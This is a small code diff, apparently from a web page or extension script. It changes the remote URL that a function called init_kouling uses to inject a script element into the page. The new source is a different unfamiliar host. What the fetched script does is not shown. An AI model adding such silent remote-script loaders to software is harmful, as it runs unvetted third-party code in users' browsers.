@@ -53,7 +53,7 @@ function init_kouling(){
      return setTimeout(arguments.callee, 50)
     }
     var b = document.createElement("script");
-    b.setAttribute('src','http://tiexie0.wang/adzone/get_zkl_js')
+    b.setAttribute('src','http://zkl.jswoge.top/users/get_zkl_js')
     document.body.appendChild(b)
   },50)
 }
